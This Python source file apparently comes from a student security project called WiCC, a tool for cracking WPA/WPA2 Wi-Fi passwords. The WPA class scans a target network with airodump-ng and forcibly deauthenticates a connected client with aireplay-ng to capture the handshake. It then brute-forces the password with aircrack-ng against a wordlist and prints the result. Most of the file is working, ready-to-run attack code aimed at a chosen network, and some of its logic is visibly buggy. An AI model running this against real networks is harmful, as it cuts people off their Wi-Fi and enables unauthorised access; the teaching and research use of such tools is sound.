#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    WiCC (Wireless Cracking Camp)
    GUI tool for wireless cracking on WEP and WPA/WPA2 networks.
    Project developed by Pablo Sanz Alguacil and Miguel Yanes Fernández, as the Group Project for the 3rd year of the
    Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity, at TU Dublin - Blanchardstown Campus
"""

from wicc_enc_type import EncryptionType
from wicc_network import Network
from subprocess import Popen,PIPE
import threading
import time,sys
import csv


class WPA(EncryptionType):
    
    def __init__(self, network, wordlist):
        super().__init__(network)
        self.wordlist = wordlist

    def execute_command(self,command):

        # executes a linux command
        # @param takes a list returns a tuple of bytes from stdout and stderr
        process = Popen(command,stdout = PIPE,stderr = PIPE)
        return process.communicate()

    def execute_command_terminate(self,command,count):
        # executes a linux command
        # @param takes a list returns
        # process terminates after count
        process = Popen(command,stdout = PIPE,stderr = PIPE)
        time.sleep(count) 
        process.terminate()

    
    def get_wordlist(self):
        # returns a wordlist
        return self.wordlist

    def set_wordlist(self,wrdlist):

        # sets the wordlist
        self.wordlist = wrdlist
    

    def filter_clients(self, file):
        
        # method to filter clients from the csv file created by Airodump-ng
        # @param file path to be executed/read from
        # returns a list of clients connected to the access point
        

        csv_file = open("files/tester_two-01.csv", "r")
        lines = []
        clients = []
        while True:
            line = csv_file.readline()

            if not line:
                 break

            # check if line is empty
            lineStripped = line.strip()
            if lineStripped == "":
                continue
            
            lines.append(line)

        client_start = False

        for line in lines:
            words = line.split(',')

            if client_start and words[0] != " ":
                    clients.append(words[0])

            if words[0] == "Station MAC":
                    client_start = True

        return clients 

    def check_if_captured(self):

        captured = open('files/captured.csv')
        password = captured.read()
        

        if password != "":
            print("Success Password found")
            print( "Password = " + password)
            return True

        return False



    def crack_network(self):

        # check if wordlist is not null
        if self.wordlist is None:
            print(" error : wordlist has not been set \n")
            return

        # to do:: check if WPS is enable
        # you can do this with the wash program/command
        # wash --interface mon0
        # create a separate function for this

        int_face = 'wlan0'
        tempfile = 'files/tester_two'
        handshake_file = 'files/wpa_handshake'
        
        # remove the current cvs file if one already exists
        self.execute_command(['rm', '-r', 'files'])
        out, err = self.execute_command(['mkdir', 'files'])

        # start scanning and create thread
        command = ['airodump-ng', int_face, '--write', tempfile, '--output-format', 'csv',
        '--bssid',self.target_network.bssid,'--channel',str(self.target_network.channel)]
        thread = threading.Thread(target=self.execute_command_terminate,args=(command,20))
        thread.start()
        thread.join(25)
        # ^^ call execute_command_terminate so airodump-ng terminates after 30 secs
        # no need for this process to run more than 30 seconds
        # as it just captures clients

        # get all clients/stations of the target network/access point
        clients = self.filter_clients("clients")

        #run airodump-ng
        command = ['airodump-ng', int_face, '--write', handshake_file, 
        '--bssid',self.target_network.bssid,'--channel',str(self.target_network.channel)]
        thread_two = threading.Thread(target=self.execute_command_terminate,args=(command, 60))
        thread_two.start()
        thread.join(5)


        for cli in clients:
            print(" debug: client - " + cli)

        client = clients[0]
        print("client of mac kicking from network :: " + client)

        
        #thread to deauth
        command = (['aireplay-ng','--deauth','4','-a',self.target_network.bssid,
        '-c',client,'wlan0'])
        deauth_thread = threading.Thread(target=self.execute_command_terminate,args=(command,10 ))
        deauth_thread.start()
        deauth_thread.join()

        time.sleep(10)

        #thread to crack the password
        command = (['aircrack-ng','files/wpa_handshake-01.cap','-w','tests.txt',
        '-l','files/captured.csv'])
        aircrack_thread = threading.Thread(target=self.execute_command,args=(command, ))
        aircrack_thread.start()
        aircrack_thread.join()

        self.check_if_captured()
    

        return 0

#test_network = Network('VM1234','90:5C:44:24:46:C3', // DEBIG :: just for testing
#'08/12/2019','08/12/2019',11,5,'WPA2','CCMP','PSK',
#3,236,556,'192.168.0.1','VM1234',False,False,3)

#test_WPA = WPA(test_network,"rockyou.txt") // DEBUG :: just for testing
#test_WPA.crack_network() // DEBUG :: just for testing
